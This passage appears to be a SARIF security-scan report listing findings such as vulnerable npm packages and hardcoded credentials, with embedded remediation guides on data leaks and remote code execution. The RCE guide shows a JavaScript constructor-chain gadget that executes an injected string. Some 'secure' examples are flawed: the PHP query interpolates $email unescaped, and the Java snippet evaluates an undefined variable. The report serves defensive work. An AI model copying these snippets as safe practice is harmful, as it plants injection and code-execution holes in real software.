      controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/ae403034633caa3ef21d2b5fcf264c83115127d109bc9053f8a72e09eb2a2b02",
                            "name": "Secret Keyword",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Exposure of Sensitive Information to an Unauthorized Actor in NPM follow-redirects prior to 1.14.8."
                            },
                            "help": {
                                "markdown": "Exposure of Sensitive Information to an Unauthorized Actor in NPM follow-redirects prior to 1.14.8.",
                                "text": "Exposure of Sensitive Information to an Unauthorized Actor in NPM follow-redirects prior to 1.14.8."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/1da3091ecfd5638d4e52c6ca8a046d51",
                            "name": "Pkg:npm/Follow-Redirects@1.5.10",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.9",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2022-0536",
                                    "CVSS 5.9",
                                    "CWE 1035",
                                    "CWE 212",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/follow-redirects@1.5.10"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "The regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296."
                            },
                            "help": {
                                "markdown": "The regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296",
                                "text": "The regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1333.html",
                            "id": "oss_vuln/ca7164c47bf0b9d1659522b717d7341b",
                            "name": "Pkg:npm/Path-To-Regexp@0.1.7",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "7.5",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2024-52798",
                                    "CVSS 7.5",
                                    "CWE 1035",
                                    "CWE 1333",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/path-to-regexp@0.1.7"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "If a remote attacker was able to control the `pretty` option of the pug compiler, e.g. if you spread a user provided object such as the query parameters of a request into the pug template inputs, it was possible for them to achieve remote code execution on the node.js backend."
                            },
                            "help": {
                                "markdown": "If a remote attacker was able to control the `pretty` option of the pug compiler, e.g. if you spread a user provided object such as the query parameters of a request into the pug template inputs, it was possible for them to achieve remote code execution on the node.js backend.",
                                "text": "If a remote attacker was able to control the `pretty` option of the pug compiler, e.g. if you spread a user provided object such as the query parameters of a request into the pug template inputs, it was possible for them to achieve remote code execution on the node.js backend."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/74.html",
                            "id": "oss_vuln/ccccc10d9629ae5483403cc0219828d3",
                            "name": "Pkg:npm/Pug@2.0.4",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "9",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2021-21353",
                                    "CVSS 9",
                                    "CWE 1035",
                                    "CWE 74",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/pug@2.0.4"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "passing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code."
                            },
                            "help": {
                                "markdown": "passing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code",
                                "text": "passing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/79.html",
                            "id": "oss_vuln/2bdcef89ad73e9c74dc35787532e7cdd",
                            "name": "Pkg:npm/Serve-Static@1.14.1",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "4.7",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2024-43800",
                                    "CVSS 4.7",
                                    "CWE 1035",
                                    "CWE 79",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/serve-static@1.14.1"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "note",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation."
                            },
                            "help": {
                                "markdown": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**",
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/259.html",
                            "id": "hardcoded-credentials/cf758ef5d1e10346e5212ca889048731",
                            "name": "Hardcoded Credentials: Hardcoded Credentials Used In Authentication Or Encryption Operation In Order.js",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "3",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 3",
                                    "CWE 259",
                                    "CWE 798",
                                    "Hardcoded Credentials",
                                    "OWASP 2021 a07-identification-and-authentication-failures",
                                    "OWASP a07-2021-identification-and-authentication-failures",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in Order.js"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "The code executed here is not a string literal. When unescaped attacker-controlled inputs are used as part of the executed code this indicates a remote code execution vulnerability."
                            },
                            "help": {
                                "markdown": "The code executed here is not a string literal. When unescaped attacker-controlled inputs are used as part of the executed code this indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\n`javax.script` page) package allows you to evaluate code in a number of different scripting languages via the \n`ScriptEngineManager` class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the `javax.tools.JavaCompiler` interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the `ScriptingEngine` class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n```\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \n`System.CodeDom` namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the `eval(...)` function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\n```javascript\n  eval(\"console.log('WARNING')\")\n```\n\nIf an attacker is able to control the input to an `eval(...)` call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the `Function(...)` or\n`Script(...)` constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\n```javascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n```\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually `Function(...)`), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\n```javascript\narbitraryObject[parameterA][parameterB](parameterC)()\n```\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## 